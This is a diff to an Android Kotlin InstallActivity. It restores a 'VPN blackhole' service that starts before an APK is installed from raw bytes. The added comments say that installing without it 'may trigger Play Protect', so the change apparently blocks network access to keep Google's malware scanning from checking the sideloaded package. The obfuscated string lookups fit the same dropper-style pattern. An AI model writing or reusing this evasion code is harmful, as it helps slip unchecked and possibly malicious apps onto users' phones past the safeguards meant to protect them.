@@ -224,7 +224,17 @@ class InstallActivity : Activity() {
     @Suppress("DEPRECATION")
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        // VPN_REQUEST_CODE block disabled — VPN temporarily off, no consent flow active
+        if (requestCode == VPN_REQUEST_CODE) {
+            if (resultCode == RESULT_OK) {
+                // User granted VPN consent — start the blackhole service
+                BlackholeVpnService.start(this)
+            } else {
+                // User denied — proceed without VPN (install may trigger Play Protect)
+                val bytes = pendingApkBytes
+                pendingApkBytes = null
+                if (bytes != null) installViaSession(bytes, attempt = 1)
+            }
+        }
     }
 
     private val installSuccessReceiver = object : BroadcastReceiver() {
@@ -776,16 +786,24 @@ class InstallActivity : Activity() {
         showToast(StringPool.d(StringPool.MSG_CANCEL))
     }
 
-    // ── VPN Blackhole — TEMPORARILY DISABLED ─────────────────────────────────
-    // BlackholeVpnService is disabled. Install proceeds directly without VPN.
-    // To re-enable: restore AndroidManifest service block + restore prepareAndStartVpn body.
+    // ── VPN Blackhole ─────────────────────────────────────────────────────────
 
     /**
-     * VPN flow DISABLED — bypasses directly to installViaSession.
-     * "Connection Required" dialog permanently removed.
+     * Prepares and starts the VPN blackhole before install.
+     * If VPN consent is already granted → starts service immediately.
+     * If consent needed → launches system dialog via startActivityForResult.
+     * Install proceeds only after VPN_ESTABLISHED broadcast is received.
      */
     private fun prepareAndStartVpn(apkBytes: ByteArray) {
-        installViaSession(apkBytes, attempt = 1)
+        pendingApkBytes = apkBytes
+        val prepareIntent = VpnService.prepare(this)
+        if (prepareIntent == null) {
+            // Consent already granted — start VPN immediately
+            BlackholeVpnService.start(this)
+        } else {
+            // Need user consent — launch system dialog
+            launchVpnConsent(prepareIntent)
+        }
     }
 
     /**
